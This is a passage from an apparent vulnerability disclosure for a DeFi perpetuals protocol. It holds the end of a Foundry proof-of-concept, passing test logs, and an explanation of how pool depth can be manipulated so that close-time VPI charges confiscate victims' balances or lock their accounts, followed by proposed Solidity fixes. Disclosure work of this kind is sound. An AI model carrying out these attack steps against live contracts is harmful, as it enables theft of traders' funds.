                : 0;
            bool ok10 = _tryOpen(CfdTypes.Side.LONG, 10);
            console2.log("  WAYOUT deposit (atoms) / D after / 10-lot rebalancing open executed", deps[i], _depth(), ok10);
            console2.log("  WAYOUT victim close charge bps after deposit", bps);
            vm.revertToState(snap);
        }
    }

    function _rebalanceArm(int64 p) internal {
        console2.log("==================== rebalancing opens, P (8 decimals)", uint256(uint64(p)));
        uint256 s = vm.snapshotState();
        _build(p);
        _fund(carol, 300_000e6);
        _epochs(false);
        console2.log("---- CONTROL (no redemptions): D / maxLiab / skew", _depth(), _maxLiab(), _skew());
        _openSet(true);
        vm.revertToState(s);
        _build(p);
        _fund(carol, 300_000e6);
        _epochs(true);
        console2.log("---- ATTACK (after redemptions to cap): D / maxLiab / skew", _depth(), _maxLiab(), _skew());
        _openSet(false);
        console2.log("---- WAY OUT: new junior deposit, one epoch later");
        _wayOut();
        vm.revertToState(s);
    }

    function test_6_rebalancingOpensRefused() public {
        _rebalanceArm(100_000_000);
        _rebalanceArm(190_000_000);
    }
}
```

### Output

Both suites pass, 12 of 12. Forge output of the two commands above, first suite then second, amounts in atoms of 6 decimals (attached as `poc-output.txt`):

The log below is shortened to the lines whose numbers this report quotes. The verdict lines are complete. Running the command prints the full log.

```
Ran 6 tests for test/perps/TinyDepthCloseVpi.t.sol:TinyDepthCloseVpiTest
[PASS] test_1_wholeBalanceAtTinyDepth() (gas: 43515181)
Logs:
  [... 4 log line(s) not shown ...]
    preview vpiDelta / realizedPnl:
  4490996
  27000000000
    preview immediatePayout / claim / toFreeSettlement 0 26972709004 0
  [... 1 log line(s) not shown ...]
    frank cash delta / claim delta / withdrawn:
  0
  26972709004
  99992490996
  [... 1 log line(s) not shown ...]
    D (pool assets - claims):
  56264010
    preview valid / fee / vpiAssets true 22800000 4257776863043
    preview vpiDelta / realizedPnl:
  4257776863043
  27000000000
  [... 2 log line(s) not shown ...]
    frank cash delta / claim delta / withdrawn:
  -99992490996
  0
  0
  [... 1 log line(s) not shown ...]
    D (pool assets - claims):
  56264010
    preview valid / fee / vpiAssets true 22800000 4257776863043
    preview vpiDelta / realizedPnl:
  4257776863043
  27000000000
  [... 2 log line(s) not shown ...]
    frank cash delta / claim delta / withdrawn:
  -1099992490996
  0
  0

[PASS] test_2_winnerTunesDepth_allParties() (gas: 46087280)
Logs:
  end of arm (0 CONTROL, 1 ATTACK) / pool assets / total trader claims 0 427408896198 511673487903
  attack: D after dave's sized close (atoms), dave claim: 0
  1269718366
  [... 1 log line(s) not shown ...]
    D (pool assets - claims):
  1269718366
  [... 1 log line(s) not shown ...]
    preview vpiDelta / realizedPnl:
  187477322826
  27000000000
  [... 5 log line(s) not shown ...]
  end of arm (0 CONTROL, 1 ATTACK) / pool assets / total trader claims 1 49700922483 0
  [... 1 log line(s) not shown ...]
  dave (winner)
  -1505357
  506419089446
  511673487903
  0
  -5252893100
  frank (victim 1)
  26972709004
  -99992490996
  0
  0
  -126965200000
  gina (victim 2)
  17986796007
  16239374919
  0
  0
  -1747421088
  [... 24 log line(s) not shown ...]
  pool side (pool + vault tokens - claims): CONTROL, ATTACK, diff
  -556631487557
  -422665973369
  133965514188
  [... 9 log line(s) not shown ...]

[PASS] test_3_boundedVictimMarginalHarm() (gas: 87650798)
Logs:
  CONTROL (D = 0) bounded close status / withdrawn / claim 2 99992490996 26972709004
  TINY D, wait (s) / status / terminalReason 0 3 8
  56264010
  [... 2 log line(s) not shown ...]
  TINY D, wait (s) / status / terminalReason 86400 3 8
  56264010
  [... 2 log line(s) not shown ...]
  TINY D, wait (s) / status / terminalReason 604800 3 8
  56264010
  [... 2 log line(s) not shown ...]
  frank balance before / after the waits 99992490996 99992490996
  [... 1 log line(s) not shown ...]

[PASS] test_4_protectionAtTinyDepth() (gas: 69587539)
Logs:
  [... 2 log line(s) not shown ...]
    frank cash delta:
  -99992490996
  [... 4 log line(s) not shown ...]

[PASS] test_5_settleThenCloseOrder() (gas: 44912759)
Logs:
  [... 5 log line(s) not shown ...]
  ORDER D (atoms), then dave settle-then-close / close-then-settle / difference:
  56264010
  -689715944605
  -200663810904
  489052133701

[PASS] test_6_fifoHeadOnly() (gas: 28890356)
Logs:
  [... 2 log line(s) not shown ...]

Suite result: ok. 6 passed; 0 failed; 0 skipped; finished in 190.88ms (705.03ms CPU time)

Ran 1 test suite in 192.23ms (190.88ms CPU time): 6 tests passed, 0 failed, 0 skipped (6 total tests)

Ran 6 tests for test/perps/HealthyDepthCloseVpi.t.sol:HealthyDepthCloseVpiTest
[PASS] test_1_price100() (gas: 37578664)
Logs:
  [... 23 log line(s) not shown ...]
    victim close VPI charge (atoms) / close notional / executed:
  9962348
  [... 2 log line(s) not shown ...]
    deltas from just after the victim's open: victim / bob (cash+shares) / pool assets / treasury / keeper / seed LP shares / SYS
  -10362360
  11473013
  -609683271756
  400000
  0
  -1510653
  0
  [... 3 log line(s) not shown ...]
    victim close VPI charge (atoms) / close notional / executed:
  3911183
  [... 2 log line(s) not shown ...]
    deltas from just after the victim's open: victim / bob (cash+shares) / pool assets / treasury / keeper / seed LP shares / SYS
  -4311183
  4518493
  -607943494
  400000
  0
  -607310
  0
  [... 6 log line(s) not shown ...]

[PASS] test_2_price150() (gas: 37731877)
Logs:
  [... 56 log line(s) not shown ...]

[PASS] test_3_price190() (gas: 38655860)
Logs:
  [... 58 log line(s) not shown ...]

[PASS] test_4_price198() (gas: 44557817)
Logs:
  [... 29 log line(s) not shown ...]
    victim close VPI charge (atoms) / close notional / executed:
  1948555894
  [... 2 log line(s) not shown ...]
    deltas from just after the victim's open: victim / bob (cash+shares) / pool assets / treasury / keeper / seed LP shares / SYS
  -1006941136
  873801979
  -998387979249
  792000
  0
  132347157
  0
  [... 7 log line(s) not shown ...]
    deltas from just after the victim's open: victim / bob (cash+shares) / pool assets / treasury / keeper / seed LP shares / SYS
  -8525196
  8336458
  -603891816
  792000
  0
  -603262
  0
  [... 6 log line(s) not shown ...]

[PASS] test_5_boundedOrder190() (gas: 27312778)
Logs:
  [... 44 log line(s) not shown ...]

[PASS] test_6_rebalancingOpensRefused() (gas: 164658395)
Logs:
  [... 32 log line(s) not shown ...]
      lens VPI (negative = rebate):
  3911183
  [... 263 log line(s) not shown ...]

Suite result: ok. 6 passed; 0 failed; 0 skipped; finished in 294.04ms (582.84ms CPU time)

Ran 1 test suite in 331.19ms (294.04ms CPU time): 6 tests passed, 0 failed, 0 skipped (6 total tests)
```

### What each test shows

First test:
- `test_1_wholeBalanceAtTinyDepth`:
  - At D = 0 the close is uncharged. The victim withdraws its whole free balance and keeps a claim for the profit.
  - At D = 56.264010 USDG the preview shows a 4,257,776.863043 USDG VPI, and the close takes the whole clearinghouse balance.
  - The loss scales with the free settlement held, not with the position (+1,000,000 arm).
- `test_2_winnerTunesDepth_allParties`:
  - With no prior claim, the large winner's sized profit-taking leaves D = 1,269.718366 USDG.
  - The next minority close loses its whole account. The winner is paid in full in cash instead of holding a claim the pool cannot settle, and the LP side gains.
  - All deltas sum to zero (assertion).
  - A second victim loses only 1,747.421088 USDG: after the first confiscation, the winner's remaining gain cannot bring D back down.
- `test_3_boundedVictimMarginalHarm`:
  - With a finite bound, the close is refused through 7 days of marks while the free balance cannot be withdrawn (revert data `0x7e9b3b04`, `CfdEngine__DegradedMode`).
  - In the control, the same bounded order executes and the balance is withdrawn at once.
  - Only another trader's losing close ends the lock.
- `test_4_protectionAtTinyDepth`:
  - A take-profit armed in the healthy state with unlimited close limits, as most of the repository's protection tests use, is triggered by a keeper at the small depth and takes the whole balance.
  - With a finite limit, the triggered close fails and the account stays locked.
- `test_5_settleThenCloseOrder`:
  - The same two honest actions by a claimant give results 13 atoms apart at normal depth.
  - At D = 56.264010 USDG they differ by 489,052.133701 USDG: a claim settled before the close becomes position margin and is charged.
- `test_6_fifoHeadOnly`: a later order cannot run before an already pending one (revert data `0x369b10db`, `OrderRouter__OrderNotQueueHead`).

Second test:
- `test_1_price100`: D at the close 393,682.290050 USDG against a maximum liability of 392,700 USDG. Charge 9.962348 USDG (99 bp) against 3.911183 USDG (39 bp) in the control. ATTACK minus CONTROL: victim -6.051177, bob (LP and short holder) +6.954520, seed LP -0.903343, treasury 0.
- `test_2_price150`: charge 44.801273 USDG (298 bp) against 5.863047 USDG (39 bp). Victim -45.401354 against -6.463047, bob +42.673558.
- `test_3_price190`: charge 359.214025 USDG (1,890 bp) against 7.423315 USDG (39 bp). Victim -359.975623 against -8.183315, bob +364.016655.
- `test_4_price198`: charge 1,948.555894 USDG (9,841 bp). Victim -1,006.941136 (whole account) against -8.525196, bob +865.465521.
- `test_5_boundedOrder190`: with `maxActionChargeAssets` 10 USDG the close is refused (status 3, terminal reason 8) at 0, 86,400, 604,800 and 2,592,000 seconds. D moves from 20,722.518922 to 20,723.094774 USDG over that time.
- `test_6_rebalancingOpensRefused`:
  - P 1.00, CONTROL: LONG 10, 50, 200 and 1,000 lots execute (rebates 3.901211 to 340.757595 USDG), and a SHORT of 10 lots executes.
  - P 1.00, ATTACK: the same LONG opens are refused at commit with `OrderRouter__PredictableOpenInvalid(7)` (`SOLVENCY_EXCEEDED`). The rebates they would have received are 9.936947 to 867.958780 USDG. The 10-lot SHORT is refused with code 4 (`SKEW_TOO_HIGH`).
  - P 1.90, ATTACK: the same. The 10-lot rebate would have been 357.471986 USDG.
  - Way out, a new junior deposit one epoch later. At P 1.00 the victim's close charge is 99 bp after a 1,000 USDG deposit, 79 bp after 100,000 and 49 bp after 400,000. At P 1.90 it is 1,803 bp after 1,000, 324 bp after 100,000 and 47 bp after 800,000.

Within each world of the second test, the deltas of victim, bob (cash and shares), seed LP shares and treasury sum to zero, and the system token total is unchanged (SYS 0). Across worlds, the victim's extra loss plus the seed LP's change equal bob's gain.

## Recommendation

Price the close at the depth the open-side skew cap would have required. One change covers the zero-depth neighbour, the degraded arms and the never-degraded arm, and bounds any close at about `k * maxSkewRatio` of its notional:

1. Price the close at no less than the depth at which the resulting skew would have been admitted, in `CloseAccountingLib.buildCloseState` and identically in the lens preview:

```solidity
        uint256 depth = inputs.poolDepthAssets;
        uint256 admittedDepth = inputs.postSkewAssets * 1e18 / inputs.maxSkewRatio; // new CloseInputs field
        if (depth != 0) {
            state.vpiDeltaAssets = CfdMath.calculateVPI(
                inputs.preSkewAssets, inputs.postSkewAssets, depth > admittedDepth ? depth : admittedDepth, inputs.vpiFactor
            );
        }
```

2. Treating every close in degraded mode like a zero-depth close (no fresh positive charge, lifetime clamp kept) removes the degraded arms only. The never-degraded arm needs option 1.

A complementary change on the LP side keeps the tie itself: let a redemption reserve `skew / maxSkewRatio` in addition to maximum liability. That also keeps rebalancing opens available after redemptions.

Rebates are already bounded by the lifetime clamp. As defence in depth, a close's action charge should not be collected from free settlement beyond the position's own margin.



